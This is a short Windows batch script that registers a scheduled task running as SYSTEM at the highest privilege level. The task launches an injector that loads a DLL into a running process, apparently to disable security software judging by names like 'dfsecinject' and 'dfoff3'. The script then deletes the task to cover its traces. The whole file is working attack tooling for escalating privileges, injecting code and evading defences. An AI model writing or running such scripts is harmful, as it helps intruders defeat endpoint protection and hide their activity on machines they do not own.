@echo off
cd /d C:\Users\User\trackA
schtasks /create /tn dfa_off4 /tr "C:\Users\User\trackA\dfsecinject.exe 50552 C:\Users\User\trackA\dfoff3.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f
schtasks /run /tn dfa_off4
ping -n 6 127.0.0.1 >nul
schtasks /delete /tn dfa_off4 /f
type off3.txt
